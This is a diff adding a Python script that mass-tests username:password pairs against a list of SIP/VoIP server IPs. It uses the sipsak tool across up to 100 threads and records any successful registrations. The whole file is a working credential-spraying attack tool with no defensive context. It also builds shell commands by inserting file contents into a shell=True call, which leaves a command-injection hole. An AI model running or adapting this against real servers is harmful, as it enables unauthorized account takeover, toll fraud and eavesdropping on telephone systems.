@@ -1,0 +1,86 @@
+import os
+import subprocess
+import threading
+
+# File containing user:password pairs in the format "user:password"
+user_pass_file = "User_Pass"
+
+# File containing a list of targets (IP addresses and ports)
+ip_file = "ip.txt"
+
+# File to save all responses (both successful and unsuccessful)
+all_responses_file = "all_responses.txt"
+
+# File to save successful results
+success_results = "success_results.txt"
+
+def register_user(user, password, target):
+    # Execute the sipsak command to register the user based on the user and password and the target
+    cmd = f"sipsak -U --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E udp"
+    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Save the response in the all_responses_file
+    with open(all_responses_file, "a") as all_responses:
+        all_responses.write(result.stdout.decode("utf-8"))
+        all_responses.write("\n")  # Add a new line after each response
+
+    # Check the result for a successful 200 OK response
+    if b"200 OK" in result.stdout:
+        # If there is a successful response, register the result in the success_results file
+        with open(success_results, "a") as success_file:
+            success_file.write(result.stdout.decode("utf-8"))
+            success_file.write("\n")  # Add a new line after each successful registration
+    else:
+        # If there is no successful response, print the error
+        print(f"Registration failed for {user} at {target}:\n{result.stderr.decode('utf-8')}")
+
+def register_users_thread(users, targets):
+    for user_pass in users:
+        user, password = user_pass.strip().split(":")
+        for target in targets:
+            target = target.strip()
+            register_user(user, password, target)
+
+def main():
+    # Read user:password pairs from the User_Pass file
+    with open(user_pass_file, "r") as users_file:
+        users = users_file.readlines()
+
+    # Read targets from the ip.txt file
+    with open(ip_file, "r") as targets_file:
+        targets = targets_file.readlines()
+
+    # Remove any empty or whitespace-only lines from targets list
+    targets = [target.strip() for target in targets if target.strip()]
+
+    if not users or not targets:
+        print("Error: User/Password or Targets lists are empty or file not found.")
+        return
+
+    # Create a list of threads
+    threads = []
+    num_threads = 100
+
+    # Make sure targets list is not empty
+    if len(targets) < 1:
+        print("Error: Targets list is empty.")
+        return
+
+    if len(targets) < num_threads:
+        num_threads = len(targets)
+
+    # Split the list of targets into chunks for each thread
+    targets_chunked = [targets[i:i + len(targets) // num_threads] for i in range(0, len(targets), len(targets) // num_threads)]
+
+    # Start and join threads
+    for i in range(num_threads):
+        thread = threading.Thread(target=register_users_thread, args=(users, targets_chunked[i]))
+        thread.start()
+        threads.append(thread)
+
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
